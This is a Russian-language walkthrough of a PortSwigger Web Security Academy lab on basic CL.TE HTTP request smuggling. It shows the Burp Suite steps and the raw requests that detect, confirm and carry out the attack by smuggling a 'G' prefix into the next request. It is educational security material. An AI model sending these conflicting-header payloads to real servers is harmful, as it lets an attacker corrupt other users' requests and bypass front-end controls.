Перейдем на уязвимый ресурс

Зайдем в `Proxy` -> `HTTP history` и отправим в `Repeater` запрос к корневой странице

Далее в панели `Inspector` изменим версию HTTP запросов на `HTTP 1` версии

и удалим служебные заголовки, которые нам не нужны 
Тем самым, оставив только 
```
POST / HTTP/1.1
Host: 0a4300c603b8a92a81a820d9006f0025.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```


![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/1.%20HTTP%20request%20smuggling%2C%20basic%20CL.TE%20vulnerability/pics%20for%20walkthrough/1.png)

Так же выключим `Update content length` и включим `видимые переносы строк`, чтобы нам было легче

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/1.%20HTTP%20request%20smuggling%2C%20basic%20CL.TE%20vulnerability/pics%20for%20walkthrough/2.png)

Далее воспользуемся данной картинкой для выяснения, какой уязвимостью может обладать данный ресурс
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/1.%20HTTP%20request%20smuggling%2C%20basic%20CL.TE%20vulnerability/pics%20for%20walkthrough/3.png)

Сконфигурируем запрос
```
POST / HTTP/1.1
Host: 0a4300c603b8a92a81a820d9006f0025.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X
```

Немного подождем, и получим ответ, что у нас - таймаут
Отлично, благодаря пикче мы узнали, что там происходит `CL.TE` уязвимость


Это происходит потому, что сервер обработал 
```
3
abc
```

а вот Х до бэкенда не дошел, так как `Content-length` составляет меньше, чем найденная последовательность
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/1.%20HTTP%20request%20smuggling%2C%20basic%20CL.TE%20vulnerability/pics%20for%20walkthrough/4.png)

Далее, согласно пикче подтвердим CL.TE уязвимости запросм

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/1.%20HTTP%20request%20smuggling%2C%20basic%20CL.TE%20vulnerability/pics%20for%20walkthrough/5.png)
```
POST / HTTP/1.1
Host: 0a4300c603b8a92a81a820d9006f0025.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/1.%20HTTP%20request%20smuggling%2C%20basic%20CL.TE%20vulnerability/pics%20for%20walkthrough/6.png)

Далее отправим уже наш вредоносный запрос
```
POST / HTTP/1.1
Host: 0a4300c603b8a92a81a820d9006f0025.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/1.%20HTTP%20request%20smuggling%2C%20basic%20CL.TE%20vulnerability/pics%20for%20walkthrough/7.png)

И сконфигурируем второй запрос
```
POST / HTTP/2
Host: 0a4300c603b8a92a81a820d9006f0025.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

foo=bar
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/1.%20HTTP%20request%20smuggling%2C%20basic%20CL.TE%20vulnerability/pics%20for%20walkthrough/8.png)

Тем самым, после первого запроса у нас не передалось `G`

и оно передалось во второй запрос, тем самым сделав его 
```
GPOST / HTTP/2
Host: 0a4300c603b8a92a81a820d9006f0025.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

foo=bar
```

После чего получим уведомление об успешно выполненной лабораторной работе и надпись 
`"Unrecognized method GPOST"`
